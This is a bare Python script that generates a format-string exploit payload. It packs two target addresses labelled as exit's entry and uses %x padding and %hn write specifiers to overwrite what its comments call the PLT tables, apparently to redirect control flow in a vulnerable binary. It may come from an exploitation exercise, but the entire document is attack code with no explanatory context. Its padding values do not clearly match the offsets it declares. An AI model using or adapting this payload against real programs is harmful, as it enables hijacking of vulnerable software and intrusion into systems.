import struct

exit_addr1 = 0x080497e0
exit_addr2 = 0x080497e0 + 2
first_offset = 0xd903
second_offset = 0xffff

payload = struct.pack("<I", exit_addr1)
payload += struct.pack("<I", exit_addr2)
payload += b"%975x"  # Will print first_offset -18  spaces
payload += b"%10$hn"   # Write in the plt tables
payload += b'%1$64574x'  # Will print second_offset - previous character printed
payload += b"%11$hn"   # Write in the plt tables

with open('payload', 'wb') as f:
    f.write(payload)
